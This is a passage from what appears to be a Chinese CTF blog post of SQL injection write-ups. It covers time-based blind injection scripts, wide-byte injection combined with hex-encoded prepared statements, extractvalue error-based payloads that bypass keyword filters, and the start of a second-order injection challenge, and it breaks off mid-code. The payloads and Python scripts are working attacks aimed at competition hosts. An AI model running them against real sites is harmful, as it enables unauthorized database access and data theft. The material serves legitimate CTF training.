<span class="token operator">=</span> <span class="token string">"http://123.206.87.240:8002/web15/"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> str<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token string">"此处为Payload"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"x-forwarded-for"</span><span class="token punctuation">:</span>data<span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h3 id="2020ichunqiu新春公益赛—盲注"><a href="#2020ichunqiu新春公益赛—盲注" class="headerlink" title="2020ichunqiu新春公益赛—盲注"></a>2020ichunqiu新春公益赛—盲注</h3><p>首先点进去的界面：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token shell-comment comment"># flag在fl4g里</span>    <span class="token keyword">include</span> <span class="token string">'waf.php'</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type: text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysql</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check_sql</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from flllllllag where id=$id"</span><span class="token punctuation">;</span>            <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>可以看到需要我们get一个id参数来绕过waf里的check_sql函数完成注入，并且<code>flag</code>在<code>fl4g</code>里</p><p>首先题目过滤了select，fuzz后发现以下字符和函数被过滤</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/gKbs6mkaDcpUx5W.png" style="zoom: 80%;" / loading="lazy"><p>发现<code>sleep</code>函数并没有被过滤，于是想到延时注入，<code>=</code>、<code>like</code>、<code>rlike</code>被过滤用<code>regexp</code>函数代替</p><p>regexp后所跟的东西作为正则表达式处理。</p><p>Payload：<code>id=1 and if(ascii(mid(fl4g,1,1))regexp 102,sleep(3),1)</code></p><p>于是写出盲注注入脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://c6a55177986a42829935671bc7988fbd1a2652564f754cac.changame.ichunqiu.com/?id="</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> j<span class="token operator">&lt;</span><span class="token number">58</span> <span class="token operator">or</span> j<span class="token operator">></span><span class="token number">96</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span>            d <span class="token operator">=</span> <span class="token string">"1 and if(ascii(mid(fl4g,"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">",1))regexp "</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">",sleep(3),1)"</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>d<span class="token punctuation">)</span>            <span class="token keyword">if</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>                <span class="token keyword">break</span></code></pre><h3 id="网鼎杯2018—Unfinish"><a href="#网鼎杯2018—Unfinish" class="headerlink" title="网鼎杯2018—Unfinish"></a>网鼎杯2018—Unfinish</h3><p>登录用的邮箱和密码，注册可以注册邮箱账号和密码，并且在登录后的index.php处有显示注册的用户名，用户名存入了数据库，于是推测在register.php处存在注入点，测试后发现过滤了逗号和information，不过可以用from和for代替，payload：<code>0&#39; or (case when (substr((select * from flag) from {} for 1 )=&#39;{}&#39;) then sleep(3) else 1 end) or &#39;1</code>，注意这里判断响应时间的时候要用time库，平常用的<code>elapsed.total_seconds()</code>在这里好像不管用，测试后发现这个函数获得的是最后一次请求的响应时间，而题目中的register.php注册成功会重定向到login.php，于是会导致结果输出不出来，于是改用time库</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timestr <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,{}_!@#$%^&amp;*.-"</span>url <span class="token operator">=</span> <span class="token string">"http://221e6a91-2118-48a2-832a-a910da7b4e1b.node3.buuoj.cn/register.php"</span>header <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span><span class="token punctuation">,</span>    <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span><span class="token punctuation">,</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">}</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> str<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"0' or (case when (substr((select * from flag) from {} for 1 )='{}') then sleep(3) else 1 end) or '1"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(payload)</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"email"</span><span class="token punctuation">:</span><span class="token string">"111@111"</span><span class="token punctuation">,</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"aaa"</span>        <span class="token punctuation">}</span>        startTime<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(r.status_code)</span>        <span class="token comment" spellcheck="true">#print(r.text)</span>        <span class="token keyword">if</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>startTime<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="2020ichunqiu新春公益赛—easysqli-copy"><a href="#2020ichunqiu新春公益赛—easysqli-copy" class="headerlink" title="2020ichunqiu新春公益赛—easysqli_copy"></a>2020ichunqiu新春公益赛—easysqli_copy</h3><p><a href="https://www.freebuf.com/articles/web/216336.html" target="_blank" rel="noopener">参考1</a> ，<a href="https://xz.aliyun.com/t/3950" target="_blank" rel="noopener">参考2</a></p><p>界面代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">try</span>    <span class="token punctuation">{</span>        <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string">'mysql:host=localhost;dbname=pdotest'</span><span class="token punctuation">,</span><span class="token string">'root'</span><span class="token punctuation">,</span><span class="token string">'******'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"select balabala from table1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$test</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'balabala'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string">"select balabala from table1 where 1=?"</span><span class="token punctuation">;</span>        <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"set names gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$row</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$row</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p> <code>$db-&gt;query(&quot;set names gbk&quot;);</code>这个语句构成了宽字节注入，即可以利用<code>%d5&#39;</code>闭合单引号形成宽字节注入，闭合单引号后后面的语句就是可控的了，所以后面只需要构造注入语句绕过waf即可，过滤的绝大多数字符，于是这里使用<code>prepare</code>预编译注入</p><p>格式：<code>set @a=执行的语句;prepare ctftest from @a; execute ctftest;</code>，该格式支持十六进制编码和ascii编码注入，于是就可以进行绕过</p><p>于是就可以用该预编译注入+延时注入+布尔盲注来爆出所有内容</p><p>爆列Payload：<code>select if(ascii(mid((select group_concat(column_name,&#39;&#39;) from information_schema.columns where table_name=&#39;table1&#39;),{},1))= {},sleep(3),1)</code></p><p>爆字段payload：<code>select if(ascii(mid((select group_concat(fllllll4g,&#39;&#39;) from table1),{},1))= {},sleep(3),1)</code></p><p>写出盲注脚本：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://8e2a5a61db69418f8ebe1c973c4bdecfa176617cfa094611.changame.ichunqiu.com/?id="</span><span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> <span class="token string">"(This is Payload)"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        payload <span class="token operator">=</span> str_to_hex<span class="token punctuation">(</span>d<span class="token punctuation">)</span>        a <span class="token operator">=</span> <span class="token string">"%df%27;set @a=0x{};prepare a from @a; execute a;"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>a<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>得到<code>table1</code>表中的列：<code>balabala,eih@y,fllllll4g,bbb</code>,最终在<code>fllllll4g</code>列中得到flag</p><h3 id="安恒杯-新春祈福赛—BabySqliv2-0"><a href="#安恒杯-新春祈福赛—BabySqliv2-0" class="headerlink" title="安恒杯-新春祈福赛—BabySqliv2.0"></a>安恒杯-新春祈福赛—BabySqliv2.0</h3><p><strong>解题核心</strong>—————–异或注入，报错注入，宽字节注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/g86QP1C5ZsThjan.png" alt="" loading="lazy"></p><p>界面的上题一样，发现只要用admin账号登录，无论用什么密码都能登录进去，登进去后界面如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200202205759631.png" alt="" loading="lazy"></p><p>于是在登录界面测试，单引号注入无效，猜测转义了单引号，利用宽字节注入，果不其然，于是利用报错注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/4cPp1rotWQnUvew.png" alt="" loading="lazy"></p><p>文章参考：<a href="https://www.gem-love.com/websecurity/467.html" target="_blank" rel="noopener">简析GXY_CTF “BabySqli v2.0”宽字节注入</a></p><p>报错注入有三种方法：floor()，extractvalue()，updatexml()，这里采用extractvalue()报错注入：</p><p>查库：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span><span class="token number">d5</span>'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>seselectlect<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">--+</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/KDtnXxQcPvYRGV6.png" alt="" loading="lazy"></p><p>查表：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span><span class="token number">d5</span>'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span>whewherere<span class="token punctuation">(</span><span class="token punctuation">(</span>table_schema<span class="token punctuation">)</span><span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">--+</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/YvlyLpUX7qZESNP.png" alt="" loading="lazy"></p><p>由此可知flag应该在f14g中</p><p>查字段：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span><span class="token number">d5</span>'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect<span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">)</span>whwhereere<span class="token punctuation">(</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token operator">=</span>char<span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">--+</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/hIfBtkgzYT4qNOa.png" alt="" loading="lazy"></p><blockquote><p>注：这里应该是过滤了列的直接查询，用char()函数进行绕过即可</p></blockquote><p>解密MD5值后为id</p><p>id列查询：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span><span class="token number">d5</span>'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect group_concat<span class="token punctuation">(</span><span class="token number">b80bb7740288fda1f201890375a60c8f</span><span class="token punctuation">)</span> <span class="token keyword">from</span> f14g<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/9wQR4Un3pDref1W.png" alt="" loading="lazy"></p><p>还真全是id了，看大佬博客后发现居然还可以盲猜flag？？？</p><p>flag的MD5值为327a6c4304ad5938eaf0efb6cc3e53dc</p><p>flag列查询：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span><span class="token number">d5</span>'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect concat<span class="token punctuation">(</span><span class="token number">327a6c4304ad5938eaf0efb6cc3e53dc</span><span class="token punctuation">)</span> <span class="token keyword">from</span> f14g<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/xoZzpbPdajKuqD3.png" alt="" loading="lazy"></p><p>base64解密后为“The first man name was k”。。。。。。。。。。</p><p>配合limit进行查询，在limit 22,1处发现flag</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span><span class="token number">d5</span>'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>selselectect concat<span class="token punctuation">(</span><span class="token number">327a6c4304ad5938eaf0efb6cc3e53dc</span><span class="token punctuation">)</span> <span class="token keyword">from</span> f14g <span class="token keyword">limit</span> <span class="token number">22</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/PXqxeEV3Hvp7cRw.png" alt="" loading="lazy"></p><p>解码后只显示前面的flag，应该是前端界面限制了字符串的显示</p><p>于是用到substr()函数进行字符串的截取：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token operator">%</span><span class="token number">d5</span>'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span>selselectect concat<span class="token punctuation">(</span><span class="token number">327a6c4304ad5938eaf0efb6cc3e53dc</span><span class="token punctuation">)</span> <span class="token keyword">from</span> f14g <span class="token keyword">limit</span> <span class="token number">22</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Qo3SelyJVt6qbkM.png" alt="" loading="lazy"></p><p>去掉相同的拼合起来base64解码后即可得到flag</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="网鼎杯-2018—Comment"><a href="#网鼎杯-2018—Comment" class="headerlink" title="网鼎杯 2018—Comment"></a>网鼎杯 2018—Comment</h3><p>上来先扫描一波，扫到了<code>.git</code>，<code>index.php</code>，<code>login.php</code>，<code>git</code>源码泄露，用<code>Githack</code>工具进行恢复</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161036570.png" alt="" loading="lazy"></p><p>发现case后的直接break了，什么操作都没有，估计这份代码不全，使用<code>git</code>进行恢复</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509161519874.png" alt="image-20200509161519874" loading="lazy"></p><p>找到历史commit版本，进行代码恢复，得到最终<code>write_do.php</code>源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">case</span> <span class="token string">'write'</span><span class="token punctuation">:</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> "insert into board            set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>                title <span class="token operator">=</span> <span class="token string">'$title'</span><span class="token punctuation">,</span>                content <span class="token operator">=</span> <span class="token string">'$content'</span>"<span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token 